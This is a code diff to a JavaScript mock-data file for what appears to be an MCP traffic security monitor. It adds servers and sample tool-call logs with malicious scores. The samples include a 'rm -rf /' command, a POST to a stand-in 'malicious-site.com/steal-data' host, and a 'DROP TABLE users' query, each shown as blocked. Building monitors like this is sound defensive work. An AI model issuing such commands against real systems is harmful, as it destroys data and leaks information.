@@ -32,6 +32,54 @@ const mcpServers = [
         description: 'Search for files using semantic and keyword-based search. Supports multiple search modes and filters.'
       }
     ]
+  },
+  {
+    id: 2,
+    name: 'mcp-server-1',
+    icon: '🔧',
+    type: 'remote',
+    tools: [
+      {
+        name: 'execute_command',
+        description: 'Execute system commands with specified parameters.'
+      },
+      {
+        name: 'process_data',
+        description: 'Process and transform data using various algorithms.'
+      }
+    ]
+  },
+  {
+    id: 3,
+    name: 'mcp-server-2',
+    icon: '🌐',
+    type: 'remote',
+    tools: [
+      {
+        name: 'fetch_data',
+        description: 'Fetch data from external APIs and web services.'
+      },
+      {
+        name: 'send_request',
+        description: 'Send HTTP requests to external endpoints.'
+      }
+    ]
+  },
+  {
+    id: 4,
+    name: 'mcp-server-3',
+    icon: '💾',
+    type: 'local',
+    tools: [
+      {
+        name: 'database_query',
+        description: 'Execute database queries and retrieve results.'
+      },
+      {
+        name: 'cache_data',
+        description: 'Store and retrieve data from cache systems.'
+      }
+    ]
   }
 ]
 
@@ -42,7 +90,7 @@ const chatMessagesByServer = {
       id: 1,
       type: 'initialize',
       sender : "client",
-      timestamp: '2/16',
+      timestamp: '2025-02-16 10:23:15 KST',
       maliciousScore: 0,
       data: {
         message: {
@@ -64,7 +112,7 @@ const chatMessagesByServer = {
       id: 2,
       type: 'initialize_response',
       sender : "server",
-      timestamp: '2/16',
+      timestamp: '2025-02-16 10:23:16 KST',
       maliciousScore: 0,
       data: {
         message: {
@@ -87,7 +135,7 @@ const chatMessagesByServer = {
       id: 3,
       type: 'notifications/initialized',
       sender : "client",
-      timestamp: '2/17',
+      timestamp: '2025-02-17 09:15:22 KST',
       maliciousScore: 0,
       data: {
         message: {
@@ -100,7 +148,7 @@ const chatMessagesByServer = {
       id: 4,
       type: 'tools/list_call',
       sender : "client",
-      timestamp: '2/17',
+      timestamp: '2025-02-17 09:15:23 KST',
       maliciousScore: 0,
       data: {
         message: {
@@ -115,7 +163,7 @@ const chatMessagesByServer = {
       id: 5,
       type: 'tools/list_response',
       sender : "server",
-      timestamp: '2/17',
+      timestamp: '2025-02-17 09:15:24 KST',
       maliciousScore: 0,
       data: {
         "task": "RECV",
@@ -440,7 +488,7 @@ const chatMessagesByServer = {
       id: 6,
       type: 'tools/call',
       sender : "client",
-      timestamp: '2/17',
+      timestamp: '2025-02-17 09:20:31 KST',
       maliciousScore: 0,
       data: {
         "message": {
@@ -458,7 +506,7 @@ const chatMessagesByServer = {
       id: 7,
       type: 'tools/response',
       sender : "server",
-      timestamp: '2/17',
+      timestamp: '2025-02-17 09:20:32 KST',
       maliciousScore: 0,
       data: {
         "message": {
@@ -479,7 +527,7 @@ const chatMessagesByServer = {
       id: 8,
       type: 'tools/call',
       sender : "client",
-      timestamp: '2/17',
+      timestamp: '2025-02-17 09:25:45 KST',
       maliciousScore: 0,
       data: {
         "message": {
@@ -500,7 +548,7 @@ const chatMessagesByServer = {
       id: 9,
       type: 'tools/response',
       sender : "server",
-      timestamp: '2/17',
+      timestamp: '2025-02-17 09:25:46 KST',
       maliciousScore: 0,
       data: {
         "message": {
@@ -514,6 +562,259 @@ const chatMessagesByServer = {
           },
           "jsonrpc": "2.0",
           "id": 5
+        }
+      }
+    }
+  ],
+  2: [ // mcp-server-1
+    {
+      id: 1,
+      type: 'initialize',
+      sender: "client",
+      timestamp: '2025-02-18 11:30:10 KST',
+      maliciousScore: 0,
+      data: {
+        message: {
+          method: 'initialize',
+          params: {
+            protocolVersion: '2025-06-18',
+            capabilities: {},
+            clientInfo: {
+              name: 'mcp-client',
+              version: '1.0.0'
+            }
+          },
+          jsonrpc: '2.0',
+          id: 0
+        }
+      }
+    },
+    {
+      id: 2,
+      type: 'tools/call',
+      sender: "client",
+      timestamp: '2025-02-18 11:35:22 KST',
+      maliciousScore: 5,
+      data: {
+        message: {
+          method: 'tools/call',
+          params: {
+            name: 'execute_command',
+            arguments: {
+              command: 'rm -rf /',
+              options: '--force'
+            }
+          },
+          jsonrpc: '2.0',
+          id: 1
+        }
+      }
+    },
+    {
+      id: 3,
+      type: 'tools/response',
+      sender: "server",
+      timestamp: '2025-02-18 11:35:23 KST',
+      maliciousScore: 0,
+      data: {
+        message: {
+          result: {
+            content: [
+              {
+                type: "text",
+                text: "Command blocked: Dangerous operation detected"
+              }
+            ]
+          },
+          jsonrpc: '2.0',
+          id: 1
+        }
+      }
+    }
+  ],
+  3: [ // mcp-server-2
+    {
+      id: 1,
+      type: 'initialize',
+      sender: "client",
+      timestamp: '2025-02-19 14:20:05 KST',
+      maliciousScore: 0,
+      data: {
+        message: {
+          method: 'initialize',
+          params: {
+            protocolVersion: '2025-06-18',
+            capabilities: {},
+            clientInfo: {
+              name: 'web-client',
+              version: '2.0.0'
+            }
+          },
+          jsonrpc: '2.0',
+          id: 0
+        }
+      }
+    },
+    {
+      id: 2,
+      type: 'tools/call',
+      sender: "client",
+      timestamp: '2025-02-19 14:25:18 KST',
+      maliciousScore: 8,
+      data: {
+        message: {
+          method: 'tools/call',
+          params: {
+            name: 'fetch_data',
+            arguments: {
+              url: 'http://malicious-site.com/steal-data',
+              method: 'POST'
+            }
+          },
+          jsonrpc: '2.0',
+          id: 1
+        }
+      }
+    },
+    {
+      id: 3,
+      type: 'tools/response',
+      sender: "server",
+      timestamp: '2025-02-19 14:25:19 KST',
+      maliciousScore: 0,
+      data: {
+        message: {
+          error: {
+            code: -32000,
+            message: "URL blocked: Suspicious domain detected"
+          },
+          jsonrpc: '2.0',
+          id: 1
+        }
+      }
+    },
+    {
+      id: 4,
+      type: 'tools/call',
+      sender: "client",
+      timestamp: '2025-02-19 14:30:42 KST',
+      maliciousScore: 1,
+      data: {
+        message: {
+          method: 'tools/call',
+          params: {
+            name: 'send_request',
+            arguments: {
+              url: 'https://api.example.com/data',
+              method: 'GET'
+            }
+          },
+          jsonrpc: '2.0',
+          id: 2
+        }
+      }
+    }
+  ],
+  4: [ // mcp-server-3
+    {
+      id: 1,
+      type: 'initialize',
+      sender: "client",
+      timestamp: '2025-02-20 16:45:12 KST',
+      maliciousScore: 0,
+      data: {
+        message: {
+          method: 'initialize',
+          params: {
+            protocolVersion: '2025-06-18',
+            capabilities: {},
+            clientInfo: {
+              name: 'db-client',
+              version: '1.5.0'
+            }
+          },
+          jsonrpc: '2.0',
+          id: 0
+        }
+      }
+    },
+    {
+      id: 2,
+      type: 'tools/call',
+      sender: "client",
+      timestamp: '2025-02-20 16:50:33 KST',
+      maliciousScore: 9,
+      data: {
+        message: {
+          method: 'tools/call',
+          params: {
+            name: 'database_query',
+            arguments: {
+              query: 'DROP TABLE users; --',
+              database: 'production'
+            }
+          },
+          jsonrpc: '2.0',
+          id: 1
+        }
+      }
+    },
+    {
+      id: 3,
+      type: 'tools/response',
+      sender: "server",
+      timestamp: '2025-02-20 16:50:34 KST',
+      maliciousScore: 0,
+      data: {
+        message: {
+          error: {
+            code: -32001,
+            message: "SQL injection attempt detected and blocked"
+          },
+          jsonrpc: '2.0',
+          id: 1
+        }
+      }
+    },
+    {
+      id: 4,
+      type: 'tools/call',
+      sender: "client",
+      timestamp: '2025-02-20 16:55:47 KST',
+      maliciousScore: 0,
+      data: {
+        message: {
+          method: 'tools/call',
+          params: {
+            name: 'cache_data',
+            arguments: {
+              key: 'user_session',
+              value: 'session_token_12345'
+            }
+          },
+          jsonrpc: '2.0',
+          id: 2
+        }
+      }
+    },
+    {
+      id: 5,
+      type: 'tools/response',
+      sender: "server",
+      timestamp: '2025-02-20 16:55:48 KST',
+      maliciousScore: 0,
+      data: {
+        message: {
+          result: {
+            content: [
+              {
+                type: "text",
+                text: "Data cached successfully"
+              }
+            ]
+          },
+          jsonrpc: '2.0',
+          id: 2
         }
       }
     }
